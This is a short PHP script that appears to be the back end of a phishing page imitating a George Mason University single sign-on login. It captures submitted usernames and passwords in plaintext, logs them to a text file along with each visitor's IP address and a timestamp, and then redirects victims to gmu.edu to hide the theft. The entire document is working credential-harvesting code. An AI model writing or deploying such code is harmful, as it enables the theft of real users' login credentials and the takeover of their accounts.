<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['j_username'];
    $password = $_POST['j_password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    
    $timestamp = date('l jS \of F Y h:i:s A');    

    $file = fopen("login_data.txt", "a");
    fwrite($file, "IP: " . $ip . " Date: " . $timestamp . " Username: " . $username . " Password: " . $password . "\n");
    fclose($file);
    
    header("Location: https://gmu.edu");
    exit;
}

?>
